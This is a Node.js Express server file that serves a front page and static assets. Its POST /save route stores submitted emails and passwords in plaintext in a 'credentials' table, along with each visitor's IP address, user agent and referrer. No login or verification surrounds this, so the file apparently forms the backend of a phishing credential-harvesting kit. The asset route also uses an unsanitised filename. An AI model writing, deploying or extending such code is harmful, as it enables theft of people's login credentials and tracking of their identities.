const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const fs = require('fs');
const path = require('path');

const app = express();

// Supabase setup
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
let supabase = null;

if (supabaseUrl && supabaseKey) {
  supabase = createClient(supabaseUrl, supabaseKey);
}

// Middleware to parse JSON
app.use(express.json());

// Root route - serve index.html
app.get('/', (req, res) => {
  try {
    const filePath = path.join(__dirname, '..', 'index.html');
    const html = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error('Error reading index.html:', error);
    res.status(500).send('Error loading page');
  }
});

// Serve CSS
app.get('/style.css', (req, res) => {
  try {
    const filePath = path.join(__dirname, '..', 'style.css');
    const css = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/css');
    res.send(css);
  } catch (error) {
    console.error('Error reading style.css:', error);
    res.status(404).send('CSS not found');
  }
});

// Serve assets
app.get('/assets/:filename', (req, res) => {
  try {
    const filePath = path.join(__dirname, '..', 'assets', req.params.filename);
    res.sendFile(filePath);
  } catch (error) {
    console.error('Error reading asset:', error);
    res.status(404).send('Asset not found');
  }
});

// Serve app.js
app.get('/app.js', (req, res) => {
  try {
    const filePath = path.join(__dirname, '..', 'app.js');
    const js = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/javascript');
    res.send(js);
  } catch (error) {
    console.error('Error reading app.js:', error);
    res.status(404).send('JS not found');
  }
});

// Route to save credentials
app.post('/save', async (req, res) => {
  if (!supabase) {
    return res.status(500).json({ success: false, message: 'Database not configured' });
  }
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent');
  const referrer = req.get('Referer');

  try {
    const { data, error } = await supabase
      .from('credentials')
      .insert([
        {
          email,
          password,
          timestamp,
          ip,
          user_agent: userAgent,
          referrer
        }
      ]);

    if (error) {
      console.error('Error saving to database:', error);
      res.status(500).json({ success: false, message: 'Failed to save credentials' });
    } else {
      res.json({ success: true, message: 'Credentials saved successfully' });
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, message: 'Failed to save credentials' });
  }
});

module.exports = app;
